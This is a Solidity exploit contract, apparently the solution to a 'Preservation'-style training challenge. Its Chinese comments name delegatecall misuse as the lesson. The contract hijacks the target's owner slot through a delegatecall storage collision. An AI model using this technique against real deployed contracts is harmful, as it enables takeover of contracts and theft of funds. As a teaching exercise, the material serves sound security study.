pragma solidity ^0.6.0;
/// @knowledgePoint delegatecall调用出错

/// @level 普通
/// @description 尝试着去获取owner

import "./perservation.sol";
contract attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = address(_time);
    }

    constructor(address _check) public {
        Check(_check).setFirstTime(uint256(uint160(address(this))));
    }

    function exp(address _check) public {
        Check(_check).setFirstTime(uint256(uint160(address(this))));
        Check(_check).isCompleted();
    }
}